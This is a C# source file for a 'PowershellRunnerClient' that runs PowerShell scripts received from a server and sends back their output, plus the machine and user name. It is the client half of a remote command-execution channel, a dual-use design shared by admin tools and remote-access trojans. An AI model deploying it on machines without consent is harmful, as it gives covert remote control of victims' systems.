using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PowershellRunnerClient
{
    internal sealed class CommandHandlers
	{
        private Runspace runspace = null;

        private string Run(string scriptText)
        {
            if(runspace == null)
            {
                runspace = RunspaceFactory.CreateRunspace();
                runspace.ThreadOptions = PSThreadOptions.ReuseThread;
                runspace.Open();
            }

            string ret = null;
            try
            {
                PowerShell ps = PowerShell.Create();
                ps.Runspace = runspace;
                ps.AddScript(scriptText);
                ps.Commands.AddCommand("Out-String");
                ps.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                Collection<PSObject> psresults = ps.Invoke();
                var sb = new StringBuilder();
                foreach (PSObject obj in psresults)
                    sb.AppendLine(obj.ToString());
                ret = sb.ToString();
            }
            catch (Exception e)
            {
                ret = e.Message;
            }
            return ret;
        }

        public void HandleMachineName(object[] @params)
        {
            Functions.LogMessage("Getting machine name..");
            SendMachineName();
        }

        public void HandleRun(object[] @params)
        {
            Functions.LogMessage("Running powershell script..");

            string scriptText = Convert.ToString(@params[1]);
            string result = Run(scriptText);

            SendRun(result);
        }

        public void SendMachineName()
        {
            ClientMain.NetworkHost.SendToServer(null, true, new object[]
            {
                CommandTypes.MachineName,
                string.Format("{0}/{1}", Environment.MachineName.ToUpper(), Environment.UserName)
            });
            Functions.LogMessage("Machine name sent to server.");
        }

        public void SendRun(string result)
        {
            ClientMain.NetworkHost.SendToServer(null, true, new object[] { CommandTypes.Run, result });

            Functions.LogMessage("Powershell result sent to server.");
        }
    }
}